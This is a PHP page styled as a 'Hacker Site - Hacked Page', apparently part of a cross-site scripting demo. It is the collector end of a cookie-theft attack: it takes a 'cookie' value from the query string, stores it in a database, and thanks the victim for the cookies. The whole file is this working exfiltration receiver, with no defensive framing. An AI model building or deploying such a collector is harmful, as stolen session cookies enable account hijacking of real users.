<?php

require __DIR__ . '/../../vendor/autoload.php';
use App\Entity\Record;
use App\Model\RecordModel;

$cookie = $_GET['cookie'] ?? null;
$message = "No cookie for me ... ok that's was just a test ...";

if($cookie){

    $record = new Record(null,urldecode($cookie));
    $recordModel = new RecordModel();
    $recordModel->create($record);
    $message = "Thank's for your cookies, yummy !";
}

?>

<!doctype html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Hacker Site - Hacked Page !</title>
</head>
<body>


<h1>Compromised!</h1>

<p><?php echo $message ?></p>


</body>
</html>